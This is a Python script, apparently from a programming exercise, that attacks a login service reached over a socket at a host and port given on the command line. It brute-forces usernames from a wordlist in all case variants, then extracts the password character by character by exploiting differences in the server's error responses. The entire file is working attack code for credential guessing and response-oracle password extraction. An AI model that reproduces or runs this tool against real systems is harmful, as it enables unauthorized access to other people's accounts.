import itertools
import json
import os
import socket
import string
import sys
from typing import Iterable

HOST = sys.argv[1]
PORT = int(sys.argv[2])
ADDRESS = (HOST, PORT)


class TxtReader:
    """Read txt files"""

    def __init__(self, file_path: str):
        self.file = file_path

    def read(self) -> str:
        with open(self.file) as f:
            for line in f:
                yield line.strip()


class Hack:
    """Password hacking methods"""

    def __init__(self, connection, login_charset: str = None, password_charset: str = None,
                 success_message: str = "Connection success!"):
        self.connection = connection
        self.login_charset = login_charset
        self.password_charset = password_charset
        self.success_message = success_message

    def brute_force_passwords(self, request_template: dict, minlength: int = 1, maxlength: int = 16) -> str:
        """Iterates over all possible combinations characters of charset from minlength to maxlength.
            If receives in response self.success_message returns password"""

        correct_char_message = json.dumps({"result": "Exception happened during login"})
        correct_password_message = json.dumps({"result": self.success_message})
        start_password = ""
        while True:
            password_generator = brute_force(self.password_charset, minlength, maxlength + 1)

            for char in password_generator:
                password = start_password + char
                request_template["password"] = password
                request_template = json.dumps(request_template)
                correct_password = send_data(self.connection, request_template)

                if correct_password == correct_char_message:
                    start_password = password
                    request_template = json.loads(request_template)
                    break

                elif correct_password == correct_password_message:
                    return request_template

                request_template = json.loads(request_template)

    def brute_typical_login(self, request_template: dict) -> dict:
        """Iterates over all possible combinations of case letters from charset.
            If receives in response self.success_message returns login"""
        correct_login_message = json.dumps({"result": "Wrong password!"})

        for lgn in self.login_charset:
            login_generator = generate_typical_passwords(lgn)
            for login in login_generator:
                request_template["login"] = login
                request_template = json.dumps(request_template)
                correct_login = send_data(self.connection, request_template)

                if correct_login == correct_login_message:
                    request_template = json.loads(request_template)
                    return request_template

                request_template = json.loads(request_template)

    def brute_login_password(self) -> str:
        """Brutes login and password combination and return data in json format"""
        login_password_values = {
            "login": " ",
            "password": " "
        }

        brute_login = self.brute_typical_login(login_password_values)
        login_password_values = self.brute_force_passwords(brute_login, 1, 1)

        return login_password_values


def brute_force(charset: Iterable, minlength: int, maxlength: int) -> str:
    """Takes an iterable object with a sequence of possible characters.
        Minimum and maximum combination length. Generates all possible combinations"""

    for length in range(minlength, maxlength + 1):
        for char in itertools.product(charset, repeat=length):
            yield "".join(char)


def generate_typical_passwords(password: str) -> str:
    """Generates all possible combinations of case letters from a takes password"""

    password_chars = [{char.upper(), char.lower()} for char in
                      password]  # set char for drops duplicates non-alpha symbols
    for pwd in itertools.product(*password_chars):
        yield "".join(pwd)


def send_data(connection, password: str) -> str:
    """Takes the opened connection, password and message that is expected to be received on success.
        Sends the password by the connection and listens for the response,
        if receives a success message in response, returns True"""

    encoded_password = password.encode()
    try:
        connection.send(encoded_password)
        response = connection.recv(1024)
        response = response.decode()
        return response
    except ConnectionAbortedError:
        pass


def main():
    password_charset = string.ascii_letters + string.digits

    path_to_logins = f"{os.path.join(os.path.dirname(os.path.abspath(__file__)))}\\logins.txt"
    login_charset = TxtReader(path_to_logins).read()

    with socket.socket() as connection:
        connection.connect(ADDRESS)
        brute = Hack(connection, login_charset=login_charset, password_charset=password_charset)
        data = brute.brute_login_password()
    print(data)


if __name__ == "__main__":
    main()
